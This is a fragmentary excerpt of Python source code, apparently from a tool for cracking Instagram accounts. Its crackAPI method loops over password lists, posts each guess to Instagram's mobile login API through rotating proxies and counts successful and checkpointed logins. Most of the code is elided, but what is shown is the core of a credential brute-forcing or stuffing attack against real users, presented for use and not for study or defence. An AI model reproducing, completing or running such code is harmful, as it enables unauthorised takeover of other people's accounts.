...
- Soraa🔥🔥 '''
    ...
    def crackAPI(self,user,pas):
        ...
        try:
            for pw in pas:
                ...
                x=s.post("https://i.instagram.com/api/v1/accounts/login/",headers=headers,data=param,proxies=proxs)
                x_jason=json.loads(x.text)
    ...
    def checkAPI(self,user,pw):
        ...
        sys.stdout.write(f"\r{CY}[•] [{K}{loop}/{len(internal)}{C}] {H}[ OK : {len(success)}]{C}  {K}[ CP : {len(checkpoint)}]{C} "),sys.stdout.flush()
        try:
            token=s.get("https://i.instagram.com/api/v1/accounts/login/",headers={"user-agent":User_Agent()}).content
